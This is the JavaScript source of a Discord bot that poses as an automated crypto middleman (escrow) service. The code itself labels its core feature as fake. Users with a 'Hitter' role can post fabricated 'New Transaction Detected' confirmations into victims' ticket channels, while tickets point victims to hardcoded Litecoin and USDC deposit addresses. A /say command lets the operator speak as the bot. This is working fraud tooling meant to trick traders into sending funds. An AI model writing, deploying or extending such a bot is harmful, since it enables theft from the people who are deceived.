const { Client, GatewayIntentBits, Partials, Events, PermissionFlagsBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { generateFakeTransaction } = require('./blockchain');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Channel, Partials.Message]
});

const OWNER_ID = '1422945082746601594';
const HITTER_ROLE_ID = '1484680314772000902';
const FINANCE_ROLE_ID = '1485363449897681017';

const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';

client.config = {
    OWNER_ID,
    HITTER_ROLE_ID,
    FINANCE_ROLE_ID,
    TICKET_CATEGORY: null,
    MANUAL_CATEGORY: null,
    LOG_CHANNEL: null,
    MONITOR_CHANNEL: null
};

client.activeTickets = new Map();
client.ltcPrice = 55.57;

const isOwner = (id) => id === OWNER_ID;
const hasHitter = (m) => m.roles.cache.has(HITTER_ROLE_ID);
const hasFinance = (m) => m.roles.cache.has(FINANCE_ROLE_ID);

const commands = [
    {
        name: 'panel',
        description: 'Spawn middleman panel (Owner only)',
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'manual',
        description: 'Spawn manual middleman panel (Owner only)',
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'tickets',
        description: 'Set auto MM ticket category (Owner only)',
        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'manualcategory',
        description: 'Set manual MM ticket category (Owner only)',
        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'log',
        description: 'Set fake transaction log channel (Owner only)',
        options: [{ name: 'channel', type: 7, description: 'Channel', required: true }],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'heh',
        description: 'Set monitor channel (Owner only)',
        options: [{ name: 'channelid', type: 3, description: 'Channel ID', required: true }],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'transaction',
        description: 'Trigger fake transaction (Hitter only)',
        options: [
            { name: 'channelid', type: 3, description: 'Ticket channel ID', required: true },
            { name: 'amount', type: 10, description: 'Amount (optional)', required: false }
        ]
    },
    {
        name: 'close',
        description: 'Close current ticket'
    },
    {
        name: 'say',
        description: 'Send message as bot (Owner only)',
        options: [
            { name: 'channel', type: 7, description: 'Target channel', required: true },
            { name: 'message', type: 3, description: 'Message to send', required: true }
        ],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    }
];

client.on(Events.GuildCreate, async (guild) => {
    try { await guild.commands.set(commands); } catch (e) { console.error('Cmd reg fail:', e); }
});

client.on(Events.ClientReady, async () => {
    console.log(`✅ Bot logged in as ${client.user.tag}`);
    for (const [, guild] of client.guilds.cache) {
        try { await guild.commands.set(commands); } catch (e) { console.error(`Cmd fail ${guild.name}:`, e); }
    }
});

client.on(Events.GuildMemberUpdate, (oldM, newM) => {
    const added = newM.roles.cache.filter(r => !oldM.roles.cache.has(r.id));
    const removed = oldM.roles.cache.filter(r => !newM.roles.cache.has(r.id));
    if (added.has(HITTER_ROLE_ID)) console.log(`[ROLE] +HITTER ${newM.user.tag}`);
    if (removed.has(HITTER_ROLE_ID)) console.log(`[ROLE] -HITTER ${newM.user.tag}`);
    if (added.has(FINANCE_ROLE_ID)) console.log(`[ROLE] +FINANCE ${newM.user.tag}`);
    if (removed.has(FINANCE_ROLE_ID)) console.log(`[ROLE] -FINANCE ${newM.user.tag}`);
});

client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isChatInputCommand()) return;
    
    const { commandName, member, user, channel } = interaction;
    console.log(`[CMD] /${commandName} by ${user.tag}`);

    const deny = (msg) => interaction.reply({ content: `❌ ${msg}`, ephemeral: true });

    try {
        switch (commandName) {
            case 'panel':
                if (!isOwner(user.id)) return deny('Owner only.');
                
                // Main info embed
                const infoEmbed = new EmbedBuilder()
                    .setTitle("Jace's Auto Middleman")
                    .setDescription('• Paid Service\n• Read our ToS before using the bot: #tos-crypto')
                    .setColor(0x2B2D31);
                
                // Fees embed
                const feesEmbed = new EmbedBuilder()
                    .setTitle('Fees:')
                    .setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**')
                    .setColor(0x2B2D31);
                
                // LTC Section embed
                const ltcEmbed = new EmbedBuilder()
                    .setTitle('Ł • Request Litecoin • Ł')
                    .setColor(0x2B2D31);
                
                const ltcRow = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId('request_ltc')
                            .setLabel('Request LTC')
                            .setStyle(ButtonStyle.Primary)
                            .setEmoji('Ł')
                    );
                
                // USDC Section embed (was USDT in image, changed to USDC per your request)
                const usdcEmbed = new EmbedBuilder()
                    .setTitle('💲 • Request USDC')
                    .setDescription('**[ERC-20]** • 💲\n• Network: **ETH (ERC-20)**')
                    .setColor(0x2B2D31);
                
                const usdcRow = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId('request_usdc')
                            .setLabel('Request USDC [ERC-20]')
                            .setStyle(ButtonStyle.Success)
                            .setEmoji('💲')
                    );
                
                await channel.send({ embeds: [infoEmbed, feesEmbed] });
                await channel.send({ embeds: [ltcEmbed], components: [ltcRow] });
                await channel.send({ embeds: [usdcEmbed], components: [usdcRow] });
                
                await interaction.deferReply({ ephemeral: true });
                await interaction.deleteReply();
                break;

            case 'manual':
                if (!isOwner(user.id)) return deny('Owner only.');
                
                const manualEmbed = new EmbedBuilder()
                    .setTitle('👤 Manual Middleman Service')
                    .setDescription('Manual middleman service, Please follow the rules and wait patiently')
                    .setColor(0xFFA500)
                    .addFields(
                        { name: 'Tier 1', value: 'Middleman ($200 or under)', inline: true },
                        { name: 'Tier 2', value: 'Middleman ($500 and under)', inline: true },
                        { name: 'Tier 3', value: 'Middleman ($1000+)', inline: true }
                    );
                
                const manualRow = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId('manual_tier1')
                            .setLabel('Tier 1 ($200)')
                            .setStyle(ButtonStyle.Primary)
                            .setEmoji('🥉'),
                        new ButtonBuilder()
                            .setCustomId('manual_tier2')
                            .setLabel('Tier 2 ($500)')
                            .setStyle(ButtonStyle.Secondary)
                            .setEmoji('🥈'),
                        new ButtonBuilder()
                            .setCustomId('manual_tier3')
                            .setLabel('Tier 3 ($1000+)')
                            .setStyle(ButtonStyle.Success)
                            .setEmoji('🥇')
                    );
                
                await channel.send({ embeds: [manualEmbed], components: [manualRow] });
                await interaction.deferReply({ ephemeral: true });
                await interaction.deleteReply();
                break;

            case 'tickets':
                if (!isOwner(user.id)) return deny('Owner only.');
                client.config.TICKET_CATEGORY = interaction.options.getString('categoryid');
                await interaction.reply({ content: `✅ Auto MM ticket category set.`, ephemeral: true });
                break;

            case 'manualcategory':
                if (!isOwner(user.id)) return deny('Owner only.');
                client.config.MANUAL_CATEGORY = interaction.options.getString('categoryid');
                await interaction.reply({ content: `✅ Manual MM ticket category set.`, ephemeral: true });
                break;

            case 'log':
                if (!isOwner(user.id)) return deny('Owner only.');
                client.config.LOG_CHANNEL = interaction.options.getChannel('channel').id;
                await interaction.reply({ content: '✅ Log channel set.', ephemeral: true });
                break;

            case 'heh':
                if (!isOwner(user.id)) return deny('Owner only.');
                client.config.MONITOR_CHANNEL = interaction.options.getString('channelid');
                await interaction.reply({ content: '✅ Monitor channel set.', ephemeral: true });
                break;

            case 'transaction':
                if (!hasHitter(member) && !isOwner(user.id)) return deny('Hitter role required.');
                const chId = interaction.options.getString('channelid');
                const txChannel = await client.channels.fetch(chId).catch(() => null);
                if (!txChannel) return deny('Invalid channel ID.');
                
                const fakeTx = generateFakeTransaction();
                const txEmbed = new EmbedBuilder()
                    .setTitle('🔔 New Transaction Detected')
                    .setDescription(`**${fakeTx.amount} ${fakeTx.currency}** ($${fakeTx.usd.toFixed(2)})`)
                    .addFields(
                        { name: 'Transaction ID', value: `\`${fakeTx.txid}\``, inline: false },
                        { name: 'Status', value: '✅ Confirmed', inline: true },
                        { name: 'Confirmations', value: '6+', inline: true },
                        { name: 'From', value: `\`${fakeTx.sender}\``, inline: true },
                        { name: 'To', value: `\`${fakeTx.receiver}\``, inline: true }
                    )
                    .setColor(0x00FF00)
                    .setTimestamp();
                
                await txChannel.send({ embeds: [txEmbed] });
                await interaction.reply({ content: `✅ Fake transaction sent to <#${chId}>`, ephemeral: true });
                break;

            case 'close':
                if (!interaction.channel.name.includes('ticket')) return deny('Not a ticket channel.');
                await interaction.reply('🔒 Closing ticket in 5 seconds...');
                setTimeout(() => interaction.channel.delete().catch(console.error), 5000);
                break;

            case 'say':
                if (!isOwner(user.id)) return deny('Owner only.');
                const sayChannel = interaction.options.getChannel('channel');
                const sayMessage = interaction.options.getString('message');
                await sayChannel.send(sayMessage);
                await interaction.reply({ content: `✅ Message sent to ${sayChannel}`, ephemeral: true });
                break;
        }
    } catch (err) {
        console.error(`[ERR] /${commandName}:`, err);
        if (!interaction.replied && !interaction.deferred) await interaction.reply({ content: '❌ Error occurred.', ephemeral: true });
    }
});

client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    
    const { customId, user } = interaction;
    
    // LTC Request - Modal with amount input
    if (customId === 'request_ltc') {
        const modal = new ModalBuilder()
            .setCustomId('ltc_modal')
            .setTitle('Request LTC');
        
        const amountInput = new TextInputBuilder()
            .setCustomId('amount')
            .setLabel('Amount in USD')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('Enter USD amount')
            .setRequired(true);
        
        const row = new ActionRowBuilder().addComponents(amountInput);
        modal.addComponents(row);
        
        await interaction.showModal(modal);
    }
    
    // USDC Request - Modal with amount input
    if (customId === 'request_usdc') {
        const modal = new ModalBuilder()
            .setCustomId('usdc_modal')
            .setTitle('Request USDC');
        
        const amountInput = new TextInputBuilder()
            .setCustomId('amount')
            .setLabel('Amount in USD')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('Enter USD amount')
            .setRequired(true);
        
        const row = new ActionRowBuilder().addComponents(amountInput);
        modal.addComponents(row);
        
        await interaction.showModal(modal);
    }
    
    // Manual tiers
    if (customId.startsWith('manual_tier')) {
        const tier = customId.replace('manual_tier', '');
        const limits = { '1': 200, '2': 500, '3': 1000 };
        const limit = limits[tier];
        
        if (!client.config.MANUAL_CATEGORY) {
            return interaction.reply({ content: '❌ Manual MM category not set.', ephemeral: true });
        }

        try {
            const ticketCh = await interaction.guild.channels.create({
                name: `manual-${user.username}-t${tier}`,
                parent: client.config.MANUAL_CATEGORY,
                permissionOverwrites: [
                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                    { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                    { id: HITTER_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                    { id: FINANCE_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel] }
                ]
            });

            const embed = new EmbedBuilder()
                .setTitle(`👤 Manual Middleman | Tier ${tier}`)
                .setDescription(`Welcome <@${user.id}>\n**Trade Limit: $${limit}**`)
                .addFields(
                    { name: 'Deposit Address (LTC)', value: `\`${LTC_ADDRESS}\``, inline: false },
                    { name: 'Network', value: 'Litecoin', inline: true },
                    { name: 'Status', value: '⏳ Waiting for middleman...', inline: true }
                )
                .setColor(0xBFBBBB);

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('close_ticket')
                        .setLabel('Close Ticket')
                        .setStyle(ButtonStyle.Danger)
                );

            await ticketCh.send({ content: `<@${user.id}> <@&${HITTER_ROLE_ID}>`, embeds: [embed], components: [row] });
            await interaction.reply({ content: `✅ Manual MM ticket created: ${ticketCh}`, ephemeral: true });
            
            client.activeTickets.set(ticketCh.id, { userId: user.id, tier, type: 'manual', limit, createdAt: Date.now() });

        } catch (e) {
            console.error('[MANUAL TICKET ERR]', e);
            await interaction.reply({ content: '❌ Failed to create ticket.', ephemeral: true });
        }
    }

    if (customId === 'close_ticket') {
        await interaction.reply('🔒 Closing ticket...');
        await interaction.channel.delete().catch(() => {});
    }
});

client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isModalSubmit()) return;
    
    // LTC Modal
    if (interaction.customId === 'ltc_modal') {
        const amount = interaction.fields.getTextInputValue('amount');
        
        if (!client.config.TICKET_CATEGORY) {
            return interaction.reply({ content: '❌ Auto MM category not set.', ephemeral: true });
        }

        try {
            const ticketCh = await interaction.guild.channels.create({
                name: `ltc-${interaction.user.username}-${amount}`,
                parent: client.config.TICKET_CATEGORY,
                permissionOverwrites: [
                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                    { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                    { id: HITTER_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                    { id: FINANCE_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel] }
                ]
            });

            const embed = new EmbedBuilder()
                .setTitle(`🤖 Auto Middleman | LTC`)
                .setDescription(`Welcome <@${interaction.user.id}>\n**Amount: $${amount}**`)
                .addFields(
                    { name: 'Deposit Address (LTC)', value: `\`${LTC_ADDRESS}\``, inline: false },
                    { name: 'Network', value: 'Litecoin', inline: true },
                    { name: 'Status', value: '⏳ Awaiting deposit...', inline: true }
                )
                .setColor(0xBFBBBB);

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('close_ticket')
                        .setLabel('Close Ticket')
                        .setStyle(ButtonStyle.Danger)
                );

            await ticketCh.send({ content: `<@${interaction.user.id}>`, embeds: [embed], components: [row] });
            await interaction.reply({ content: `✅ LTC ticket created: ${ticketCh}`, ephemeral: true });
            
            client.activeTickets.set(ticketCh.id, { 
                userId: interaction.user.id, 
                crypto: 'LTC',
                amount,
                type: 'auto',
                createdAt: Date.now() 
            });

        } catch (e) {
            console.error('[LTC TICKET ERR]', e);
            await interaction.reply({ content: '❌ Failed to create ticket.', ephemeral: true });
        }
    }
    
    // USDC Modal
    if (interaction.customId === 'usdc_modal') {
        const amount = interaction.fields.getTextInputValue('amount');
        
        if (!client.config.TICKET_CATEGORY) {
            return interaction.reply({ content: '❌ Auto MM category not set.', ephemeral: true });
        }

        try {
            const ticketCh = await interaction.guild.channels.create({
                name: `usdc-${interaction.user.username}-${amount}`,
                parent: client.config.TICKET_CATEGORY,
                permissionOverwrites: [
                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                    { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                    { id: HITTER_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                    { id: FINANCE_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel] }
                ]
            });

            const embed = new EmbedBuilder()
                .setTitle(`🤖 Auto Middleman | USDC`)
                .setDescription(`Welcome <@${interaction.user.id}>\n**Amount: $${amount}**`)
                .addFields(
                    { name: 'Deposit Address (USDC)', value: `\`${USDC_ADDRESS}\``, inline: false },
                    { name: 'Network', value: 'Ethereum (ERC-20)', inline: true },
                    { name: 'Status', value: '⏳ Awaiting deposit...', inline: true }
                )
                .setColor(0x2775CA);

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('close_ticket')
                        .setLabel('Close Ticket')
                        .setStyle(ButtonStyle.Danger)
                );

            await ticketCh.send({ content: `<@${interaction.user.id}>`, embeds: [embed], components: [row] });
            await interaction.reply({ content: `✅ USDC ticket created: ${ticketCh}`, ephemeral: true });
            
            client.activeTickets.set(ticketCh.id, { 
                userId: interaction.user.id, 
                crypto: 'USDC',
                amount,
                type: 'auto',
                createdAt: Date.now() 
            });

        } catch (e) {
            console.error('[USDC TICKET ERR]', e);
            await interaction.reply({ content: '❌ Failed to create ticket.', ephemeral: true });
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
